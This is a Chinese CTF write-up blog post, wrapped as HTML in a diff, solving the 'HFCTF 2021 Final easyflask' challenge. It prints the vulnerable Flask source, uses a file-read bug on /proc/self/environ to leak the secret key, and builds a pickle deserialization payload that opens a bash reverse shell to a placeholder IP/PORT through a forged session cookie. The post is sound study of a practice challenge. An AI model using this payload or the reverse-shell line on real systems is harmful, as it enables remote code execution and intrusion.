@@ -1,0 +1,481 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="第一次遇到python反序列化的题目,折磨有来咯~~">
+  <meta name="author" content="Noel">
+  <meta name="keywords" content="">
+  
+  <title>HFCTF2021Finaleasyflask - Noel&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"n0el4kls.github.io","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>N0el4kLs's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/web_source/shine.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="HFCTF2021Finaleasyflask">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-01 01:04" pubdate>
+        2021年9月1日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      629 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      10
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HFCTF2021Finaleasyflask</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：几秒前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>第一次遇到python反序列化的题目,折磨有来咯~~</p>
+<span id="more"></span>
+
+<h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HFCTF%202021%20Final]easyflask">[HFCTF 2021 Final]easyflask</a></p>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>按到提示,访问<code>/file?file=/app/source</code>,拿到源码,开始审计</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3.6</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;*******&quot;</span><br><br>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: o.uname,<br>&#125;)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index_handler</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):<br>        u = pickle.dumps(User())<br>        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file_handler</span>():</span>   <span class="hljs-comment"># 读取传入的 file 文件,并返回文件读取结果</span><br>    path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    path = os.path.join(<span class="hljs-string">&#x27;static&#x27;</span>, path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path) <span class="hljs-keyword">or</span> os.path.isdir(path) \   <span class="hljs-comment"># 存在任意文件读取</span><br>            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        content = fp.read()<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin_handler</span>():</span>  <span class="hljs-comment"># session判断</span><br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>        u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>
+
+<p> 简单查看源码,应该是 <code>pickle</code>反序列化考点.很明显我们得先获取<code>SECRET_KEY</code>,以伪造session,构成反序列化.</p>
+<p>由于在<code>/file</code>理由存在任意文件读取,读取下当前运行的环境变量<code>/proc/self/environ</code>,发现疑是暴露<code>SECRET_KEY</code>,<code>glzjin22948575858jfjfjufirijidjitg3uiiuuh</code></p>
+<p><img src="/images/2021-09-01-HFCTF2021Finaleasyflask/image-20210902003408714.png" srcset="/img/loading.gif" lazyload alt="image-20210902003408714"></p>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>重新构造<code>User</code>,设置反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">import</span> os<br><br><br><br>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: o.uname,<br>    <span class="hljs-string">&#x27;__reduce__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: (os.system, (<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&#x27;&quot;</span>,))<br>&#125;)<br>u = pickle.dumps(User())<br><span class="hljs-built_in">print</span>(b64encode(u).decode())<br><span class="hljs-comment"># gASVRQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCpiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwL0lQL1BPUlQgMD4mMSeUhZRSlC4=</span><br></code></pre></td></tr></table></figure>
+
+<p>并利用拿到的<code>glzjin22948575858jfjfjufirijidjitg3uiiuuh</code>,使用<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">脚本</a>生成需要替换的cookie,这里提醒下需要加密的字符串为<code>&#123;&#39;u&#39;:&#123;&#39;b&#39;:&#39;gASVRQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCpiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwL0lQL1BPUlQgMD4mMSeUhZRSlC4=(这一串字符串为上面生成的结果)&#39;&#125;&#125;</code></p>
+<p>在vps上打开监听</p>
+<p><img src="/images/2021-09-01-HFCTF2021Finaleasyflask/image-20210902011725700.png" srcset="/img/loading.gif" lazyload alt="asdfa">    </p>
+<p>构造数据包并发送,查看vps,反弹成功.直接<code>cat/flag</code>拿下</p>
+<p><img src="/images/2021-09-01-HFCTF2021Finaleasyflask/image-20210902015035948.png" srcset="/img/loading.gif" lazyload alt="image-20210902015035948">    </p>
+<p><img src="/images/2021-09-01-HFCTF2021Finaleasyflask/image-20210902011848988.png" srcset="/img/loading.gif" lazyload alt="image-20210902011848988"></p>
+<p><img src="/images/2021-09-01-HFCTF2021Finaleasyflask/image-20210902011901332.png" srcset="/img/loading.gif" lazyload alt="image-20210902011901332"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次遇到python反序列化的题目,构造很简单,至于关于为什么要用<code>__reduce__</code>,请查看参考文章的第二个链接</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://tyskill.github.io/posts/hfctf2021final/">https://tyskill.github.io/posts/hfctf2021final/</a></p>
+<p><a target="_blank" rel="noopener" href="http://47.96.160.180/2021/04/29/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://47.96.160.180/2021/04/29/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/python/">python</a>
+                    
+                      <a class="hover-with-bg" href="/tags/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">python代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/flask/">flask</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/09/01/Python-Summary/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python_Summary</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/29/De1CTF2019SSRFMe/">
+                        <span class="hidden-mobile">De1CTF2019SSRFMe</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
